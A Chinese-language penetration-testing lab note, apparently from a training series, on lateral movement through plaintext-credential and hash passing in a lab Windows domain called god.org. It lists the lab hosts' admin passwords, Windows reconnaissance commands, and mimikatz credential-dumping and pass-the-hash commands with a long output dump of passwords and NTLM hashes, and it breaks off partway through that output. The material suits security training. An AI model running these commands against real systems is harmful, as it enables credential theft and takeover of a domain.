# 思维导图

![](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-0.png)

![66-1](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-1.png)

# 环境配置

#### **2008 r2 webserver**

域内 web 服务器
本地管理员账号密码 :
.\administraotr:admin!@#45
当前机器域用户密码 :

god\webadmin:admin!@#45

![](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-24.png)

-----------------------------------------------------------------------------------------------------------------------------------------------------------

#### 2003 x86 fileserver

域内文件服务器
本地管理员账号密码 :
administrator : admin
当前机器域用户密码 :

god\fileadmin : Admin12345

-----------------------------------------------------------------------------------------------------------------------------------------------------------

#### 2008 r2 x64 dc god.org

主域控机器
域管账号密码:

God\administrator : Admin12345

-----------------------------------------------------------------------------------------------------------------------------------------------------------

#### 2012 sqlserver

域内数据库服务器
本地管理员账号密码 :
.\administrator:admin!@#45
当前机器域用户密码 :

god\dbadmin:admin!@#45

-----------------------------------------------------------------------------------------------------------------------------------------------------------

#### w7 x64 mary-pc

域内个人机
本地管理员账号密码 :
.\mary : admin
当前机器域用户密码 :

god\mary : admin!@#45

-----------------------------------------------------------------------------------------------------------------------------------------------------------

#### w8.1 x64 jack-pc

域内个人机
本地管理员账号密码 :
.\jack : admin
当前机器域用户密码 :
god\boss : Admin12345



# 演示案例：



## 横向渗透明文 HASH 传递批量利用-升级版

拿下**2008 r2 webserver**权限后进行信息收集

##### 信息收集

```shell
net user
net start
tasklist
schtasks
at
ipconfig /all     判断存在域-dns
net time /domain  判断主域
netstat -ano      当前网络端口开放
nslookup   		  域名 追踪来源地址

```

`net user`

![](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-2.png)

`net start`

![66-3](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-3.png)

`tasklist`

![66-4](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-4.png)

`schtasks`

![66-5](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-5.png)

`ipconfig / all`

![66-6](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-6.png)

`net view /domain`

![66-7](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-7.png)

`net time /domain`

![66-8](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-8.png)

`nslookup 计算机名称`

![66-9](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-9.png)

`netstat -ano`

![66-10](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-10.png)



mimikazt搜集收集用户凭证

```shell
log
privilege ::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export
sekurlsa::pth /user:Administrateur /domain:god.org/ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd

```

- log
- privilege ::debug

```shell
mimikatz # Using 'mimikatz.log' for logfile : OK
mimikatz # privilege::debug
Privilege '20' OK
```

- sekurlsa::logonpasswords

```shell
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 521318 (00000000:0007f466)
Session           : Interactive from 1
User Name         : webadmin
Domain            : GOD
Logon Server      : OWA2010CN-GOD
Logon Time        : 2022/5/8 20:39:30
SID               : S-1-5-21-1218902331-2157346161-1782232778-1132
	msv :	
	 [00000003] Primary
	 * Username : webadmin
	 * Domain   : GOD
	 * LM       : e90127c07127ed12f4ebf668acca53e9
	 * NTLM     : 518b98ad4178a53695dc997aa02d455c
	 * SHA1     : 39aa99a9e2a53ffcbe1b9eb411e8176681d01c39
	tspkg :	
	 * Username : webadmin
	 * Domain   : GOD
	 * Password : admin!@#45
	wdigest :	
	 * Username : webadmin
	 * Domain   : GOD
	 * Password : admin!@#45
	kerberos :	
	 * Username : webadmin
	 * Domain   : GOD.ORG
	 * Password : admin!@#45
	ssp :	
	credman :	

Authentication Id : 0 ; 143584 (00000000:000230e0)
Session           : Service from 0
User Name         : MSSQLFDLauncher
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:53
SID               : S-1-5-80-3263513310-3392720605-1798839546-683002060-3227631582
	msv :	
	 [00000003] Primary
	 * Username : WEBSERVER$
	 * Domain   : GOD
	 * NTLM     : 450098ea358ba14a9e17e3690b94c0e4
	 * SHA1     : 946f96a330bd558a1af3ee06fb4edf90ed58c909
	tspkg :	
	 * Username : WEBSERVER$
	 * Domain   : GOD
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 
	wdigest :	
	 * Username : WEBSERVER$
	 * Domain   : GOD
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 
	kerberos :	
	 * Username : WEBSERVER$
	 * Domain   : god.org
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WEBSERVER$
Domain            : GOD
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:21
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : WEBSERVER$
	 * Domain   : GOD
	 * NTLM     : 450098ea358ba14a9e17e3690b94c0e4
	 * SHA1     : 946f96a330bd558a1af3ee06fb4edf90ed58c909
	tspkg :	
	wdigest :	
	 * Username : WEBSERVER$
	 * Domain   : GOD
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 
	kerberos :	
	 * Username : webserver$
	 * Domain   : GOD.ORG
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 
	ssp :	
	credman :	

Authentication Id : 0 ; 47208 (00000000:0000b868)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:21
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : WEBSERVER$
	 * Domain   : GOD
	 * NTLM     : 450098ea358ba14a9e17e3690b94c0e4
	 * SHA1     : 946f96a330bd558a1af3ee06fb4edf90ed58c909
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 794675 (00000000:000c2033)
Session           : Interactive from 2
User Name         : Administrator
Domain            : WEBSERVER
Logon Server      : WEBSERVER
Logon Time        : 2022/5/8 20:47:14
SID               : S-1-5-21-95064677-3481858386-3840636109-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : WEBSERVER
	 * LM       : e90127c07127ed12f4ebf668acca53e9
	 * NTLM     : 518b98ad4178a53695dc997aa02d455c
	 * SHA1     : 39aa99a9e2a53ffcbe1b9eb411e8176681d01c39
	tspkg :	
	 * Username : Administrator
	 * Domain   : WEBSERVER
	 * Password : admin!@#45
	wdigest :	
	 * Username : Administrator
	 * Domain   : WEBSERVER
	 * Password : admin!@#45
	kerberos :	
	 * Username : Administrator
	 * Domain   : WEBSERVER
	 * Password : admin!@#45
	ssp :	
	 [00000000]
	 * Username : administrator
	 * Domain   : god.org
	 * Password : Admin12345
	credman :	

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:25
SID               : S-1-5-17
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 103189 (00000000:00019315)
Session           : Service from 0
User Name         : ReportServer
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:24
SID               : S-1-5-80-2885764129-887777008-271615777-1616004480-2722851051
	msv :	
	 [00000003] Primary
	 * Username : WEBSERVER$
	 * Domain   : GOD
	 * NTLM     : 450098ea358ba14a9e17e3690b94c0e4
	 * SHA1     : 946f96a330bd558a1af3ee06fb4edf90ed58c909
	tspkg :	
	 * Username : WEBSERVER$
	 * Domain   : GOD
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 
	wdigest :	
	 * Username : WEBSERVER$
	 * Domain   : GOD
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 
	kerberos :	
	 * Username : WEBSERVER$
	 * Domain   : GOD.ORG
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 
	ssp :	
	credman :	

Authentication Id : 0 ; 99637 (00000000:00018535)
Session           : Service from 0
User Name         : MSSQLServerOLAPService
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:23
SID               : S-1-5-80-2872255330-672591203-888807865-2791174282-1554802921
	msv :	
	 [00000003] Primary
	 * Username : WEBSERVER$
	 * Domain   : GOD
	 * NTLM     : 450098ea358ba14a9e17e3690b94c0e4
	 * SHA1     : 946f96a330bd558a1af3ee06fb4edf90ed58c909
	tspkg :	
	 * Username : WEBSERVER$
	 * Domain   : GOD
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 
	wdigest :	
	 * Username : WEBSERVER$
	 * Domain   : GOD
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 
	kerberos :	
	 * Username : WEBSERVER$
	 * Domain   : god.org
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 
	ssp :	
	credman :	

Authentication Id : 0 ; 98391 (00000000:00018057)
Session           : Service from 0
User Name         : MSSQLSERVER
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:23
SID               : S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
	msv :	
	 [00000003] Primary
	 * Username : WEBSERVER$
	 * Domain   : GOD
	 * NTLM     : 450098ea358ba14a9e17e3690b94c0e4
	 * SHA1     : 946f96a330bd558a1af3ee06fb4edf90ed58c909
	tspkg :	
	 * Username : WEBSERVER$
	 * Domain   : GOD
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 
	wdigest :	
	 * Username : WEBSERVER$
	 * Domain   : GOD
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 
	kerberos :	
	 * Username : WEBSERVER$
	 * Domain   : god.org
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 
	ssp :	
	credman :	

Authentication Id : 0 ; 93005 (00000000:00016b4d)
Session           : Service from 0
User Name         : MsDtsServer110
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:22
SID               : S-1-5-80-1770670200-1234090253-3451813168-4041049723-2370973757
	msv :	
	 [00000003] Primary
	 * Username : WEBSERVER$
	 * Domain   : GOD
	 * NTLM     : 450098ea358ba14a9e17e3690b94c0e4
	 * SHA1     : 946f96a330bd558a1af3ee06fb4edf90ed58c909
	tspkg :	
	 * Username : WEBSERVER$
	 * Domain   : GOD
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 
	wdigest :	
	 * Username : WEBSERVER$
	 * Domain   : GOD
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 
	kerberos :	
	 * Username : WEBSERVER$
	 * Domain   : god.org
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:21
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
